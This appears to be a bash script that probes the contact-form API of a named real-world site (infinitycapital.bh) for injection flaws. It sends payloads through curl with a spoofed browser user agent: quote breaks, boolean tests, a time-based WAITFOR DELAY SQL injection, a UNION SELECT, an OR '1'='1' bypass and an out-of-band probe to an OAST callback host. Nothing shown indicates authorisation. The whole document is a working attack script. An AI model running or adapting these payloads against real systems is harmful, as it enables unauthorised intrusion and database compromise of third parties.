#!/bin/bash
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"
T="https://www.infinitycapital.bh/api/send"
# polite: 1 request every 6s
post () {
  local label="$1"; shift
  printf "%-40s " "$label"
  curl -sk -A "$UA" -m 25 -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
       --data "$1" -o /tmp/rr.bin -w "HTTP=%{http_code} sz=%{size_download} t=%{time_total} " "$T"
  head -c 100 /tmp/rr.bin | tr -d '\n'; echo
  sleep 6
}
echo "### /api/send injection matrix (differential oracle = response body/time)"
post "baseline-valid"      'fname=D10&lname=P&areacode=973&tel=1234567&cname=QA&subject=Hi&msgTxt=Hello&targets=General'
post "empty"               ''
post "fname-quote"         "fname=D10'&lname=P"
post "fname-boolean-true"  'fname=D10&lname=P&areacode=973&tel=1234567&msgTxt=x&targets=1&check=1'
post "fname-boolean-false" 'fname=D10&lname=P&areacode=973&tel=1234567&msgTxt=x&targets=0&check=1'
post "tel-sqli-time"       "fname=D10&lname=P&areacode=973&tel=1234567'+WAITFOR+DELAY+'0:0:6'--&msgTxt=x"
post "msg-sqli-union"      "fname=D10&lname=P&msgTxt=x'+UNION+SELECT+NULL--"
post "cname-boolean"       "fname=D10&lname=P&cname='+OR+'1'='1"
post "targets-array"       'fname=D10&lname=P&targets[]=a&targets[]=b'
post "targets-oob-probe"   'fname=D10&lname=P&targets=http://oob0574a7f353f1.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/x'
echo DONE
